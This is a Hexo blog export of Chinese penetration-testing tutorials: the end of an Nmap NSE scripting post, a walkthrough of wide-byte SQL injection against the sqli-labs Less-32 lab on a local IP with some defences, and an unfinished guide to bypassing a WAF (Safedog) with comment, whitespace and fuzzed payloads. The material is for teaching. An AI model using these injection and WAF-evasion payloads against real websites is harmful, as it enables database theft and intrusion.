<p>结果<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200610150817708.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>11. host.times<br>里面字段中的内容是目标的时序数据<br>咧<br>代码<br>我保存到了名为<code>wode.nse</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">local shortport &#x3D; require &quot;shortport&quot;</span><br><span class="line"></span><br><span class="line">description &#x3D; [[]]</span><br><span class="line"></span><br><span class="line">author &#x3D; &quot;root&quot;</span><br><span class="line"></span><br><span class="line">license &#x3D; &quot;Same as Nmap--See http:&#x2F;&#x2F;nmap.org&#x2F;book&#x2F;man-legal.html&quot;</span><br><span class="line"></span><br><span class="line">categories &#x3D; &#123;&quot;default&quot;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">portrule &#x3D; function(host, port)</span><br><span class="line">	return true</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">action &#x3D; function(host, port)</span><br><span class="line"></span><br><span class="line">	return host.times</span><br><span class="line"></span><br><span class="line">end</span><br></pre></td></tr></table></figure>
<p>叫<code>wode.nse</code>移动到<code>/usr/share/nmap/scripts/</code>文件下面<br>复制进去要更新一下nmap脚本的数据库<br>命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap --script-updatedb</span><br></pre></td></tr></table></figure>
<p>结果<img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200610151030145.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<ol start="12">
<li>host.traceroute<br>字段中的数据只有指定–traceroute才会出现，<br><code>--traceroute</code>参数是跟踪路由用于检测您的计算机数据包从路由器到ISP的路由到互联网直至其特定目的地<br>咧<br>代码<br>我保存到了名为<code>wode.nse</code></li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">local shortport &#x3D; require &quot;shortport&quot;</span><br><span class="line"></span><br><span class="line">description &#x3D; [[]]</span><br><span class="line"></span><br><span class="line">author &#x3D; &quot;root&quot;</span><br><span class="line"></span><br><span class="line">license &#x3D; &quot;Same as Nmap--See http:&#x2F;&#x2F;nmap.org&#x2F;book&#x2F;man-legal.html&quot;</span><br><span class="line"></span><br><span class="line">categories &#x3D; &#123;&quot;default&quot;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">portrule &#x3D; function(host, port)</span><br><span class="line">	return true</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">action &#x3D; function(host, port)</span><br><span class="line"></span><br><span class="line">	return host.traceroute</span><br><span class="line"></span><br><span class="line">end</span><br></pre></td></tr></table></figure>
<p>叫<code>wode.nse</code>移动到<code>/usr/share/nmap/scripts/</code>文件下面<br>复制进去要更新一下nmap脚本的数据库<br>命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap --script-updatedb</span><br></pre></td></tr></table></figure>
<p>结果<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200610152910882.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h2 id="QQ2737977997"><a href="#QQ2737977997" class="headerlink" title="QQ2737977997"></a>QQ2737977997</h2>]]></content>
      <categories>
        <category>黑客工具使用</category>
        <category>nmap</category>
      </categories>
      <tags>
        <tag>渗透工具使用</tag>
      </tags>
  </entry>
  <entry>
    <title>6. 网易web安全渗透， sql漏洞之宽字节注入</title>
    <url>/2020/08/10/6.%20%E7%BD%91%E6%98%93web%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%EF%BC%8C%20sql%E6%BC%8F%E6%B4%9E%E4%B9%8B%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<script src="/assets/js/DPlayer.min.js"> </script><h2 id="宽字节注入原理"><a href="#宽字节注入原理" class="headerlink" title="宽字节注入原理"></a>宽字节注入原理</h2><h3 id="什么是宽字节"><a href="#什么是宽字节" class="headerlink" title="什么是宽字节"></a>什么是宽字节</h3><p>GB2312、GBK、GB18030、BIG5、Shift_JIS都是常见的宽字节编码</p>
<ul>
<li><p>1个字节的字符，是短字节，所有的英文占1个字节</p>
<ul>
<li>我们都知道1个字节占8位比如<code>a</code>二进制表示就是<code>01011101</code>，0和1组合有255种完全满足英文的</li>
</ul>
</li>
<li><p>2个字节的字符，是宽字节，中文默认都是占两个字节的</p>
<ul>
<li>如果我们用1个字节表示中文是远远不够的，所有要用两个字节</li>
</ul>
</li>
</ul>
<h3 id="什么是宽字节注入"><a href="#什么是宽字节注入" class="headerlink" title="什么是宽字节注入"></a>什么是宽字节注入</h3><p><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200818091131109.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_emhhb19zZV9haS5naXRlZS5pbw==,size_20,color_006400,t_70" alt="在这里插入图片描述"></p>
<p>防御：有的网站会进行过滤，<code>&#39;</code>给转换成<code>\&#39;</code><br>绕过：将\给消灭掉<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200818091609298.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_emhhb19zZV9haS5naXRlZS5pbw==,size_20,color_006400,t_70" alt="在这里插入图片描述"></p>
<h2 id="宽字节注入实战"><a href="#宽字节注入实战" class="headerlink" title="宽字节注入实战"></a>宽字节注入实战</h2><p>第32关</p>
<h3 id="判断是否存在sql注入漏洞"><a href="#判断是否存在sql注入漏洞" class="headerlink" title="判断是否存在sql注入漏洞"></a>判断是否存在sql注入漏洞</h3><p>输入URL：<code>http://192.168.0.108/Less-32/?id=1</code><br>正常显示</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200818093121739.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>下面加上<code>&#39;</code><br>输入URL地址： <code>http://192.168.0.108/Less-32/?id=1&#39;</code><br>这个他专门显示了被转换了<code>\&#39;</code><br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200818093727965.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>我们就可以进行宽字节探测了<br>添加<code>%df</code><br>输入URL：<code>http://192.168.0.108/Less-32/?id=1%df&#39;</code><br><code>%df</code>加<code>\</code>会变成<code>運</code><br>就没有<code>\</code>了</p>
<p>发现是可以注入点<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200818094514610.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>如果还是不确定可以用<code>and 1=1</code>来判断</p>
<p>输入URL：<code>http://192.168.0.108/Less-32/?id=1%df&#39; and 1=1  --+</code><br>正常<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200818095156648.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>输入URL：<code>http://192.168.0.108/Less-32/?id=1%df&#39; and 1=2  --+</code><br>没有显示<br>是确定是存在sql注入漏洞的<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200818095239932.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<h3 id="进行读取数据"><a href="#进行读取数据" class="headerlink" title="进行读取数据"></a>进行读取数据</h3><p>和基本的注入查询一样</p>
<ol>
<li><p>判断有几列<br> 输入URL：<code>http://192.168.0.108/Less-32/?id=1%df&#39; order by 2  --+</code> </p>
<p> 输入<code>2</code>显示正常<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200818095546443.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>发现输入到4就报错了<br>输入URL：<code>http://192.168.0.108/Less-32/?id=1%df&#39; order by 4  --+</code> </p>
</li>
</ol>
<p><strong>可以判断有<code>3</code>列</strong><br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200818095646855.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>2. 观察页面返回，选择可以显示数据的位置，进行下一步的注入<br>    输入URL：<code>http://192.168.0.108/Less-32/?id=-1 %df&#39; union select 1,2,3   --+</code><br>    <strong>结果是<code>2</code>和<code>3</code></strong><br>    <img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/2020081810011290.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>3. 读取库的信息<br>    输入URL：<code>http://192.168.0.108/Less-32/?id=-1 %df&#39; union select 1,user(),3   --+</code><br>    内容显示了<img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/2020081810024953.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>4. 查看数据库名<br>    输入URL：<code>http://192.168.0.108/Less-32/?id=-1 %df&#39; union select 1,(select schema_name from information_schema.schemata LIMIT 0,1),3   --+</code><br>    这个他之显示第一个数据库的名<img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200818100503615.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>    <strong>读取全部的库名</strong><br>    输入URL：<code>http://192.168.0.108/Less-32/?id=-1 %df&#39; union select 1,(select group_concat(schema_name) from information_schema.schemata),3   --+</code><br>    用到了group_concat()函数，<br>应为有很多数据库他只能显示一个，所以用group_concat()叫所以库名都显示到一列中<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200818100715400.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<ol start="5">
<li><p>读取查表<br> 通过上面的查询找到数据库全部的数据库名<br>通过数据库名就可以查询表了<br>输入URL：<code>http://192.168.0.108/Less-32/?id=-1 %df&#39; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39;),3   --+</code><br>发现报错了应为’security’你面有用<code>&#39;</code></p>
<p> <img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200818101612779.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>我们就可以进行编码逃避用<code>&#39;</code><br>输入URL：<code>http://192.168.0.108/Less-32/?id=-1 %df&#39; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=0x7365637572697479),3   --+</code> </p>
<p> 就读取出来表了<img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200818101852262.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>等等后面都和普通的注入方法一样就不演示了</p>
</li>
</ol>
<h2 id="宽字节注入防御"><a href="#宽字节注入防御" class="headerlink" title="宽字节注入防御"></a>宽字节注入防御</h2><ol>
<li>使用UTF-8就可以完美防御宽字节注入<ol start="2">
<li>php mysql_real_escape_string()函数和mysqli_set_charset() 函数</li>
</ol>
</li>
</ol>
<pre><code>1.mysql_real_escape_string()是用来转义 SQL 语句中使用的字符串中的特殊字符
下列字符受影响：


<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">\x00</span><br><span class="line">\n</span><br><span class="line">\r</span><br><span class="line">\</span><br><span class="line">&#39;</span><br><span class="line">&quot;</span><br><span class="line">\x1a</span><br></pre></td></tr></table></figure>
如果成功，则该函数返回被转义的字符串。如果失败，则返回 false。
2.mysqli_set_charset()函数是修改数据库连接字符集
他两个组合起来就可以防御了</code></pre>
<ol start="3">
<li>设置成二进制的模式就可以了<br> mysql_query() 函数执行一条 MySQL 查询<br> 他有两个参数一个是执行的语句一个是执行的，可选。规定 SQL 连接标识符<br> 这个里面就可以添加一个<code>character_set_client=binary</code><br>就可以防御了</li>
</ol>
]]></content>
      <categories>
        <category>web安全</category>
        <category>sql注入</category>
      </categories>
      <tags>
        <tag>web安全</tag>
      </tags>
  </entry>
  <entry>
    <title>8. 网易web安全渗透， sql注入waf绕过</title>
    <url>/2020/09/09/8.%20%E7%BD%91%E6%98%93web%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%EF%BC%8C%20sql%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87/</url>
    <content><![CDATA[<script src="/assets/js/DPlayer.min.js"> </script><h2 id="waf也叫做：网站应用级入侵防御系统"><a href="#waf也叫做：网站应用级入侵防御系统" class="headerlink" title="waf也叫做：网站应用级入侵防御系统"></a>waf也叫做：网站应用级入侵防御系统</h2><h2 id="waf绕过原理"><a href="#waf绕过原理" class="headerlink" title="waf绕过原理"></a>waf绕过原理</h2><h3 id="白盒waf绕过原理"><a href="#白盒waf绕过原理" class="headerlink" title="白盒waf绕过原理"></a>白盒waf绕过原理</h3><p>代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span>(<span class="params">$id</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	$id= preg_replace(<span class="string">&#x27;/or/i&#x27;</span>,<span class="string">&quot;&quot;</span>, $id);			<span class="comment">//strip out OR (non case sensitive)</span></span><br><span class="line">	$id= preg_replace(<span class="string">&#x27;/AND/i&#x27;</span>,<span class="string">&quot;&quot;</span>, $id);		<span class="comment">//Strip out AND (non case sensitive)</span></span><br><span class="line">	<span class="keyword">return</span> $id;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$id=$_GET[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">$id= blacklist($id);</span><br><span class="line">$hint=$id;</span><br><span class="line">$sql=<span class="string">&quot;SELECT * FROM users WHERE id=&#x27;$id&#x27; LIMIT 0,1&quot;</span>;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br><span class="line"><span class="keyword">if</span>($row)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Your Login name:&#x27;</span>. $row[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Your Password:&#x27;</span> .$row[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>可以看到<code>blacklist()</code>函数里面过滤了去<code>ADN</code>和<code>OR</code>还有一个<code>i</code>意思是大小写都可以</p>
<p>像上面的我们家可以用</p>
<p><code>and</code>改成<code>&amp;&amp;</code></p>
<p><code>or</code>改成<code>||</code><br>如果没有添加<code>i</code>就可以用大小写绕过了<br>就可以解决了</p>
<h3 id="黑盒绕过waf"><a href="#黑盒绕过waf" class="headerlink" title="黑盒绕过waf"></a>黑盒绕过waf</h3><h4 id="架构层绕过"><a href="#架构层绕过" class="headerlink" title="架构层绕过"></a>架构层绕过</h4><ol>
<li>云WAF绕过<br>云WAF的原理图<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20200910075736.png"><br>我们绕过就只需要找到真正的服务器就可以了</li>
<li>同网段绕过<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20200910080537.png"><br>我们想办法进入到内网就可以解决了</li>
</ol>
<h4 id="资源限制绕过WAF"><a href="#资源限制绕过WAF" class="headerlink" title="资源限制绕过WAF"></a>资源限制绕过WAF</h4><p>他的意思就是，如果用户发送特别大的数据包</p>
<p>应为WAF过滤大的数据包会变的缓慢，所以就减少过滤大的数据包的内容</p>
<p>黑客就可以进行在大的数据包里面写入sql语句进行注入</p>
<h4 id="协议层面绕过WAF的检查"><a href="#协议层面绕过WAF的检查" class="headerlink" title="协议层面绕过WAF的检查"></a>协议层面绕过WAF的检查</h4><ol>
<li><p>协议未覆盖绕过WAF</p>
<ol>
<li><p>比如<code>GET</code>改成<code>POTS</code>有点就可以绕过了</p>
</li>
<li><p>猜数污染绕过WAF<br>比如一个URL地址是<code>http://xxxxx/a?id=1</code><br>我们可以用<code>http://xxxxx/a?id=1&amp;id=2</code><br>有的WEB服务器要的是最后一个猜数<code>id=2</code><br>有的WAF他之过滤第一个猜数<code>id=1</code><br>这样就可以绕过了WAF了</p>
</li>
</ol>
</li>
</ol>
<h3 id="常见的绕过方法（规则层面的绕过）原理"><a href="#常见的绕过方法（规则层面的绕过）原理" class="headerlink" title="常见的绕过方法（规则层面的绕过）原理"></a>常见的绕过方法（规则层面的绕过）原理</h3><h4 id="sql注释符来绕过"><a href="#sql注释符来绕过" class="headerlink" title="sql注释符来绕过"></a>sql注释符来绕过</h4><p>简单的注释来绕过WAF</p>
<p>有的WAF对<code>union select</code>进行防御</p>
<p>我们就可以用下面方法来进行注入了<br>比如1 <code>union/**/select</code><br>他的语句是</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="keyword">users</span> <span class="keyword">WHERE</span> <span class="keyword">id</span>=<span class="number">1</span> <span class="keyword">union</span><span class="comment">/**/</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> ;</span><br></pre></td></tr></table></figure>
<p>结果<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20200910091019.png"></p>
<p>其他的注释绕过的语句</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">union<span class="comment">/*aaaaa%01bbs*/</span><span class="keyword">select</span></span><br><span class="line"><span class="keyword">union</span><span class="comment">/*aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa*/</span><span class="keyword">select</span></span><br><span class="line"><span class="comment">/*!xxx*/</span></span><br></pre></td></tr></table></figure>
<h4 id="空白符绕过"><a href="#空白符绕过" class="headerlink" title="空白符绕过"></a>空白符绕过</h4><p>mysql空白符</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">%20 %09 %0a %0b  %0d %0C %a0 %00 <span class="comment">/**/</span>  <span class="comment">/*!*/</span></span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20200910093349.png"></p>
<h4 id="正则空白符"><a href="#正则空白符" class="headerlink" title="正则空白符"></a>正则空白符</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">%20 %09 %0a %0b  %0d</span><br></pre></td></tr></table></figure>
<p>咧.1</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">union%250cselect</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20200910094001.png"></p>
<p>%25=%<br>0=0<br>c=c</p>
<p>他就是<code>%0c</code>他就是空<br>咧.2</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">union%25a0select</span><br></pre></td></tr></table></figure>
<p>%25a0=%a0</p>
<p>%a0就是空</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20200910095918.png"></p>
<h4 id="函数分割符号绕过WAF"><a href="#函数分割符号绕过WAF" class="headerlink" title="函数分割符号绕过WAF"></a>函数分割符号绕过WAF</h4><p>WAF可能会对数据库敏感函数进行防御<br>比如</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">version()  mysql数据库版本</span><br><span class="line">database() 　　当前数据库名</span><br><span class="line">user() 　　用户名</span><br><span class="line">current_user() 　　当前用户名</span><br><span class="line">system_user() 　　系统用户名</span><br><span class="line">@@datadir　　 数据库路径</span><br><span class="line">@@version_compile_os 　　操作系统版本</span><br></pre></td></tr></table></figure>
<p>绕过方法</p>
<p>我们就可以用</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">concat<span class="comment">/**/</span>()</span><br><span class="line">concat%250c()</span><br><span class="line"></span><br><span class="line">等等</span><br></pre></td></tr></table></figure>
<h4 id="浮点型的进行绕过WAF"><a href="#浮点型的进行绕过WAF" class="headerlink" title="浮点型的进行绕过WAF"></a>浮点型的进行绕过WAF</h4><p>有点WAF会过滤int行动字符行的，都是他过滤不了浮点型的</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="keyword">users</span> <span class="keyword">WHERE</span> <span class="keyword">id</span>=<span class="number">8</span>EOunion <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> ;</span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="keyword">users</span> <span class="keyword">WHERE</span> <span class="keyword">id</span>=<span class="number">8.0</span><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> ;</span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="keyword">users</span> <span class="keyword">WHERE</span> <span class="keyword">id</span>=\Nunion <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> ;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h4 id="利用报错注入进行过滤waf"><a href="#利用报错注入进行过滤waf" class="headerlink" title="利用报错注入进行过滤waf"></a>利用报错注入进行过滤waf</h4><p>应为报错注入会出现不常见的mysql函数<br>这个就不多说了</p>
<h4 id="mysql特殊语法绕过WAF"><a href="#mysql特殊语法绕过WAF" class="headerlink" title="mysql特殊语法绕过WAF"></a>mysql特殊语法绕过WAF</h4><h2 id="实战绕过waf"><a href="#实战绕过waf" class="headerlink" title="实战绕过waf"></a>实战绕过waf</h2><h3 id="找寻是否存在sql注入"><a href="#找寻是否存在sql注入" class="headerlink" title="找寻是否存在sql注入"></a>找寻是否存在sql注入</h3><p>这个我用的是安全狗<br>我输入</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.31.94&#x2F;Less-1&#x2F;?id&#x3D;1 and 1&#x3D;1</span><br></pre></td></tr></table></figure>
<p>他就会拦截<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20200910115236.png"></p>
<p>进行fuzz过滤waf</p>
<p>用Burp进行fuzz过滤waf</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20200911080402.png"></p>
<p>添加特殊字符进行fuzz</p>
<p>其他不常用的字符也可以<br>这个我用的是下面的字符</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a1!%(&#39;&amp;&#x2F;*</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20200911090335.png"><br>结果</p>
<p>可以看到很多都是被过滤了</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20200911090505.png"><br>在浏览器看一下<br>是呗过滤了<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20200911090725.png"></p>
<p>看一下其他响应的大小来查询fuzz</p>
<p>看到语法报错了<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20200911091128.png"><br>在浏览器上查看一下<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20200911091224.png"></p>
<p>可以看到现在显示正常<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20200911090929.png"><br>在浏览器看一下</p>
<p>显示正常<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20200911091555.png"><br>URL是</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.31.94&#x2F;Less-1&#x2F;?id&#x3D;1&#39;&#x2F;*%!*&#x2F;and&#x2F;*%!*&#x2F;1&#x3D;1&#x2F;*%!*&#x2F;--+</span><br></pre></td></tr></table></figure>
<p>我们修改成<code>2</code>看看</p>
<p>URL是</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.31.94&#x2F;Less-1&#x2F;?id&#x3D;1&#39;&#x2F;*%!*&#x2F;and&#x2F;*%!*&#x2F;1&#x3D;2&#x2F;*%!*&#x2F;--+</span><br></pre></td></tr></table></figure>
<p>发现<code>/*%!*/</code>是可以绕过waf的<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20200911091750.png"><br>上面fuzz出来能绕过waf的字符</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;1&#39;&#x2F;*!*&#x2F;and&#x2F;*!*&#x2F;1&#x3D;1&#x2F;*!*&#x2F;--+</span><br><span class="line">?id&#x3D;1&#39;&#x2F;*%!*&#x2F;and&#x2F;*%!*&#x2F;1&#x3D;1&#x2F;*%!*&#x2F;--+</span><br><span class="line">?id&#x3D;1&#39;&#x2F;*%!1*&#x2F;and&#x2F;*%!1*&#x2F;1&#x3D;1&#x2F;*%!1*&#x2F;--+</span><br><span class="line">?id&#x3D;1&#39;&#x2F;*%!!*&#x2F;and&#x2F;*%!!*&#x2F;1&#x3D;1&#x2F;*%!!*&#x2F;--+</span><br><span class="line">?id&#x3D;1&#39;&#x2F;*%%!*&#x2F;and&#x2F;*%%!*&#x2F;1&#x3D;1&#x2F;*%%!*&#x2F;--+</span><br><span class="line">?id&#x3D;1&#39;&#x2F;*%!%*&#x2F;and&#x2F;*%!%*&#x2F;1&#x3D;1&#x2F;*%!%*&#x2F;--+</span><br><span class="line">等等等等......</span><br></pre></td></tr></table></figure>

<h3 id="ORDER-BY-判断列数"><a href="#ORDER-BY-判断列数" class="headerlink" title="ORDER BY 判断列数"></a>ORDER BY 判断列数</h3><p>我用上面的的fuzz出来的用着<code>ORDER BY</code>函数发现不能用<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20200911100114.png"><br>在进行fuzz<br>其他不常用的字符也可以<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20200911100655.png"><br>这个我用的是下面的字符</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a1!%(&#39;&amp;&#x2F;*</span><br></pre></td></tr></table></figure>
